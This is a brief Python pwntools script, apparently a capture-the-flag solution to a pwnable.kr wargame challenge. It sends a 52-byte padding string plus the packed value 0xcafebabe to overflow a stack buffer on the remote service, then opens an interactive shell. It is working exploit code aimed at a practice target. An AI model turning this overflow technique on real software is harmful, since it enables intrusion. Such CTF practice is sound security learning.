import struct
from pwn import *

key = struct.pack('<I', 0xcafebabe)

r = remote('pwnable.kr', 9000)
r.sendline('A' * 52 + key)

reply = r.recv(4096, timeout=1)
r.interactive()
